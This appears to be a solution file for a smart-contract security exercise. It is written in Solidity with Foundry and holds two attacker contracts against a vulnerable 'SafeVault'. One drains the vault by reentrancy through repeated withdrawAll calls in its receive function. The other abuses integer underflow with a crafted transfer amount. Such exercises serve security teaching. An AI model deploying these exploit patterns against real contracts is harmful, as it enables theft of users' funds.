// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/SafeVault.sol";
import "../src/Attacker.sol";

interface ISafeVault {
    function balance(address) external view returns (uint256);
    function withdrawAll(address) external;
    function deposit() external payable;
    function transfer(address, uint256) external;
}

contract ReentrancyAttacker {
    receive() external payable {
        // Write your own code.
        // You have 10 deposit balance.
        // Be careful that the target (vulnerable) contract has 10_020 ethereum total.

        ISafeVault safeVault = ISafeVault(msg.sender);

        if(address(this).balance > 5000) return ;
        
        safeVault.deposit{value: address(this).balance}();
        safeVault.withdrawAll(address(this));
        

    }
}

contract IntegerOverUnderflowAttacker {
    receive() external payable {}

    function integerOverUnderflowAttackHandler(address vault) external {
        // Write your own code.
        // You have 10 deposit balance.
        // Be careful that the target (vulnerable) contract has 10_020 ethereum total.

        ISafeVault safeVault = ISafeVault(vault);

        safeVault.transfer(address(69), type(uint256).max - 10010 + 1);
        safeVault.withdrawAll(address(this));

        return ;
    }
}
